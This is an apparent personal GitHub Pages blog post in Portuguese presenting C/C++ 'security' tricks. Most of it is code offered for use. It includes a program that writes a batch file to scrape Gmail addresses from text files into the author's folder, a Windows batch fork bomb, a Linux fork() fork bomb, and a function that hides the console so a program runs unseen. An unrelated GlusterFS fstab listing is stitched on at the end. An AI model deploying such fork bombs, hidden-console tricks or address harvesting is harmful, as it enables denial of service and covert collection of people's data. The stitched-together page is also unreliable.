<!DOCTYPE html>                               
<html>    
  <head>   
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">

    <link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="screen">
    <link rel="stylesheet" type="text/css" href="stylesheets/pygment_trac.css" media="screen">
    <link rel="stylesheet" type="text/css" href="stylesheets/print.css" media="print">

    <title>C/C++ by rodcaseribe</title>                           
  </head>                       

  <body>
    <header>                                  
    
      <div class="container">                                                                                                
        <!--<h4 style="color:#009900">$service glusterfs-server start</h4>--><p><code><pre><img align="left" width="140px" height="140px" src="https://fbcdn-profile-a.akamaihd.net/hprofile-ak-xpa1/v/t1.0-1/p160x160/11666123_680963255338867_3272092498190692095_n.jpg?oh=e455ffa32a074cff960d2ad2b2437041&oe=56706719&__gda__=1449916324_23bb04b85b24a3fc5dc23431f241d2fd"></img>
        <h3 align="middle"> -->">Rodolfo Cr</h3><h3 align="middle">undergroundiscovery@gmail.com</h3><br><br><h5 align="left" "style="color:#880000"><a href="https://github.com/rodcaseribe"><img width="40px" height="40px" src="http://icons.iconarchive.com/icons/social-media-icons/social-buntings/512/Github-icon.png"></img></a></h5></pre></code></p>
        <!--<h2 align="center">C/C++</h2>-->    
        <!--<section id="downloads">
          <a href="https://github.com/rodcaseribe/guster/zipball/master" class="btn">Download as .zip</a>
          <a href="https://github.com/rodcaseribe/guster/tarball/master" class="btn">Download as .tar.gz</a>
          <a href="https://github.com/rodcaseribe/guster" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>-->
      </div>  
    </header>
    <div class="container">
      <section id="main_content">
        <h3>
<a id="welcome-to-github-pages" class="anchor" href="#welcome-to-github-pages" aria-hidden="true"><span class="octicon octicon-link">C/C++</span></a></h3>

<p>Irei falar um pouco sobre C e C++, algumas coisas bacanas da linguagem sobre segurança.</p><br>
<p><a href="" class="user-mention">*Explorando o System<br>
</a></p>
<br>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char *argv[]) {
system("dir C:"); //listando
}</code></pre></h5></h5></h5></h5>
<p>Bom até aqui nada de novo , vemos que com o system padrão ensinado na faculdade conseguimos executar comandos DOS no caso do Windows.</p></h5></h5>
<p>Podemos fazer também com ponteiros:</p></h5></h5>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;dirent.h&gt; //header dirent

int main(void)
{
DIR *pont; //ponteiro pra dir
struct dirent *entrada;  //Data Type padrão
pont = opendir("c:\\");
while ( ( entrada = readdir(pont) ) != NULL )
{
printf ("%s\n", entrada-&gt;d_name);
}
closedir(pont);
return 0;
}
</code></pre>
<p>Bom, podemos também fazer chamadas externas, executáveis por exemplo com comando Start do MSDOS já que estamos em cima de Windows</p></h5></h5>
<code><pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char *argv[]) {
system("start /Max c.exe");
system("pause");
return 0;
}</pre></code>
<p>Aí fica da criatividade de executar qualquer comando DOS de quem cria.</p><br><p>Uma coisa bacana é varrer pasta onde normalmente não se tem permissão no Windows 7 jogando em outra, e pegar emails por exemplo.</p></h5></h5></h5>
<code><pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
int main(int argc, char *argv[]) {
FILE *fp;
fp = fopen("file99.bat","w+");  //habilito gravacao em arquivo, no caso bat ja que estamos em cima de Windows
fprintf(fp, "%s" "%s", "cd / \n","findstr @gmail.com *.txt &gt;C:/Users/rodolfo/Documents/peguei.txt"); //  filtro por find e jogo onde tem permissão
fclose(fp);
system("start /Max file99.bat");
return 0;
}</pre></code>
<p>Aqui crio um ponteiro e dou permissão de gravação onde assim insiro os comando com "fprint", filtrando e jogando em outra pasta e no final executo o "*.bat".<br>
formate e monte.
</p>
<p><a href="" class="user-mention">*Bomb-Fork básico no Windows 7<br>
</a></p>
<br>
<code><pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include&lt;windows.h&gt;
int main(int argc, char *argv[]) {
FILE * fp;
fp = fopen ("red.bat","w+");
fprintf(fp, "%s" "%s" "%s",":12 \n","@start %0 \n","@goto 12");
fclose(fp);
system("start /Max red.bat");
return(0);
}</pre></code>
<p>Mesmo conceito, porém criei um loop infinito no DOS  onde instancio e chamo com @goto.
No Linux podemos usar o unistd.h pra acessar diretamente os ficheiros e diretorios, já temos até um fork pronto basicamente, só jogar true no while e ser feliz.</p>

<code><pre>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main(){
while (1) {
fork();
}
return(0);
}</pre></code>
<p>Maravilha, mais e aí como executar isso em segundo plano!? Afinal, e se eu não quiser mostrar o console e rodar meu programa em Background.

Tem uma função simples pra isso:</p>
<code><pre>void stealth (){
HWND stealth;
AllocConsole();
stealth = FindWindowA("consoleWindowClass", NULL);
ShowWindow(stealth, 0);
}
</pre></code>
<p></p>Adicione no fstab para montar no boot.</p>
<code><pre>$nano /etc/fstab<br><br>
  @aero-no1:~$ cat /etc/fstab<br>
# /etc/fstab: static file system information.<br>
#
# Use 'blkid' to print the universally unique identifier for a<br>
# device; this may be used with UUID= as a more robust way to name devices<br>
# that works even if disks are added and removed. See fstab(5).<br>
#<br>
# <file system> <mount point>   <type>  <options>       <dump>  <pass><br>
# / was on /dev/md0 during installation<br>
UUID=f8cef5df-a65b-4407-b3a1-cf2a1b1cb6b1 /               ext4    errors=remount-ro 0       1<br>
# /gluster/data was on /dev/sdb1 during installation<br>
/dev/sdb1 /home   ext4    defaults        0       2<br>
aero-no1:/clusteraero	/share	glusterfs	defaults,_netdev	0	0<br>
aero-no2:/clusteraero   /share  glusterfs       defaults,_netdev        0       0<br>
aero-no3:/clusteraero   /share  glusterfs       defaults,_netdev        0       0<br>
aero-no4:/clusteraero   /share  glusterfs       defaults,_netdev        0       0<br>
aero-no5:/clusteraero   /share  glusterfs       defaults,_netdev        0       0<br>
<br>
# swap was on /dev/md1 during installation<br>
UUID=2d165a0d-99eb-4879-bbcf-761fa81f8712 none            swap    sw              0       0<br>
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0<br>
/dev/sdd1       /media/usb0     auto    rw,user,noauto  0       0<br>
</pre></code>
<!--
<h3>
<a id="designer-templates" class="anchor" href="#designer-templates" aria-hidden="true"><span class="octicon octicon-link"></span></a>Designer Templates</h3>
<p>We've crafted some handsome templates for you to use. Go ahead and continue to layouts to browse through them. You can easily go back to edit your page before publishing. After publishing your page, you can revisit the page generator and switch to another theme. Your Page content will be preserved if it remained markdown format.</p>
<h3>
<a id="rather-drive-stick" class="anchor" href="#rather-drive-stick" aria-hidden="true"><span class="octicon octicon-link"></span></a>Rather Drive Stick?</h3>
<p>If you prefer to not use the automatic generator, push a branch named <code>gh-pages</code> to your repository to create a page manually. In addition to supporting regular HTML content, GitHub Pages support Jekyll, a simple, blog aware static site generator written by our own Tom Preston-Werner. Jekyll makes it easy to create site-wide headers and footers without having to copy them across every page. It also offers intelligent blog support and other advanced templating features.</p>
<h3>
<a id="authors-and-contributors" class="anchor" href="#authors-and-contributors" aria-hidden="true"><span class="octicon octicon-link"></span></a>Authors and Contributors</h3>
<p>You can <a href="https://github.com/blog/821" class="user-mention">@mention</a> a GitHub username to generate a link to their profile. The resulting <code>&lt;a&gt;</code> element will link to the contributor's GitHub Profile. For example: In 2007, Chris Wanstrath (<a href="https://github.com/defunkt" class="user-mention">@defunkt</a>), PJ Hyett (<a href="https://github.com/pjhyett" class="user-mention">@pjhyett</a>), and Tom Preston-Werner (<a href="https://github.com/mojombo" class="user-mention">@mojombo</a>) founded GitHub.</p>
<h3>
<a id="support-or-contact" class="anchor" href="#support-or-contact" aria-hidden="true"><span class="octicon octicon-link"></span></a>Support or Contact</h3>
<p>Having trouble with Pages? Check out the documentation at <a href="https://help.github.com/pages">https://help.github.com/pages</a> or contact <a href="mailto:support@github.com">support@github.com</a> and we’ll help you sort it out.</p>
      </section>
    </div>-->
    
  </body>
</html>
